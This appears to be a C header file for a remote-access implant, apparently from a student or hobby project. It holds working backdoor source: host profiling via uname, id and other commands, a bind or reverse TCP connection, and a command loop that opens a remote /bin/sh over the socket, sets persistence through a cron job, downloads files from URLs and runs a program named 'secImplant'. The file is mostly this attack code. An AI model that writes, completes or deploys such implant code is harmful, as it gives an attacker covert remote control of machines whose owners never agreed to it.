#pragma once

/*

#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <sys/types.h>
#include "helper.h"
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/utsname.h>


#include "valHelper.h"

#include "url2file.c"

*/

//#include "helper.h"


char* strProfile(){
    struct utsname uts;
    uname(&uts);
    char * giantList = calloc(2048, 1);
    strcat(giantList,uts.sysname);
    strcat(giantList,"\n");

    strcat(giantList,uts.machine);
    strcat(giantList,"\n");

    strcat(giantList,uts.release);
    strcat(giantList,"\n");

    strcat(giantList,uts.version);
    strcat(giantList,"\n");

    FILE *fp;
    char * path = calloc(2048, 1);

    // (UID or group ID) of ppl in sys
    fp = popen("id", "r");
    fgets(path, 1035, fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    //Linux command line utility that is used in case a user wants to know the shared library dependencies of an executable or shared library
    fp = popen("ldd --version", "r");
    fgets(path, 1035, fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    // used to query and change the system locale and keyboard layout settings.
    fp = popen("localectl status", "r");
    fgets(path, 1035, fp);
    strcat(giantList, path);
    strcat(giantList,"\0");

    /* close */
    pclose(fp);
    return giantList;
}


void connection();

/*
   int main(int argc, char * argv[]) {

   char * outSTR = malloc(2048);
   outSTR= strProfile();
   printf("%s", outSTR);
   return 0;

   shell(5000);
   }
   */

void connection()
{

    int port = atoi(PORT);
    int sockfd, confd;
    
#ifdef BIND
    int num = (rand() % (7 - 2 + 1)) + 2;
    //upper = max number
    //lower = least number
    sleep(num);

    //setting up the socket
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    int reuse = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse)) < 0)
        perror("setsockopt(SO_REUSEADDR) failed");


    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, (const char*)&reuse, sizeof(reuse)) < 0)
        perror("setsockopt(SO_REUSEPORT) failed");

    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    listen(sockfd, 0);

    confd = accept(sockfd, NULL, NULL);
#endif


#ifdef REVERSE
    const char *ip = "127.0.0.1"; //this means localhost
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    confd = socket(AF_INET, SOCK_STREAM, 0);
    connect(confd, (struct sockaddr *)&addr, sizeof(addr));
#endif

    /*
    // execute the shell
    execve("/bin/sh", NULL, NULL);
    */
    char * comd = calloc(256, 1);
    int act;


    while(1){
        act = recv(confd, comd, 256, 0);

        /*if (act < 0){
          perror("Error reading from socket.");
          exit(5);
          }*/
        write(STDOUT_FILENO, comd, act);//writing the buffer to std out

        /*
           if( recv(sockfd, comd , sizeof(comd) , 0) < 0)
           {
           puts("recv failed");
           }
           puts("Reply received\n");
           puts(comd);
           */


        //while((getchar()) != '\n');
        //recv(sockfd, &comd, 255, 0);

        char *arg0, *arg1, *token;

        //get the first token
        token = strtok(comd, " ");
        arg0 = token;
        //walk through other tokens
        while( token != NULL ) {
            arg1 = token;
            token = strtok(NULL, " ");
        }
        //printf("%s\n", arg0);
        //printf("%s", arg1);

        //char arg[128];
        //fscanf(sockfd, "%s", arg);
        if (strcmp(comd, "SHELL\n") == 0){

            int proc = fork();
            for (int i = 0; i < 3; i++)
            {
                dup2(confd, i);
            }
            if(proc >= 1){//parent
                wait(NULL);//wait until child terminates
            }
            else if (proc == 0){//child process
                execl ("/bin/sh", "sh", NULL);
            }
        }

        else if (strcmp(comd, "UNINSTALL\n") == 0){
            remove(arg0);
        }

        else if (strcmp(comd, "EXIT\n") == 0){
            dprintf(confd, "Killing process\n");
            kill(getpid(), SIGKILL);
        }

        else if (strcmp(arg0, "SLEEP") == 0){
            int sleepTime = atoi(arg1);
            //scanf("%d", &sleepTime);
            dprintf(confd, "Going to sleep for %d seconds", sleepTime);
            sleep(sleepTime);
        }

        else if (strcmp(comd, "PROFILING\n") == 0){
            //char buf2[1028];
            //strcpy(strProfile(), buf2);
            write(confd, strProfile(), 2048);
            //send(confd, buf2, 2048, 0);
        }

        else if (strcmp(comd, "PERSIST\n") == 0){
            cron_job();
        }
        else if (strcmp(arg0, "DO_DOWNLOAD") == 0){
            dprintf(confd, "Downloading file now.");
            url2file(arg1);
        }

        else if (strcmp(comd, "DO_EXEC\n") == 0){

            int proc = fork();
            for (int i = 0; i < 3; i++)
            {
                dup2(confd, i);
            }
            if(proc >= 1){//parent
                wait(NULL);//wait until child terminates
            }
            else if (proc == 0){//child process
                char* args[] = { "secImplant", NULL };
                execvp ("secImplant", args);
            }

        }

        else{
            printf("Incorrect Command.\n");
            continue;
        }
        memset(comd, 0, 256);
        //while((getchar()) != '\n');
    }
}
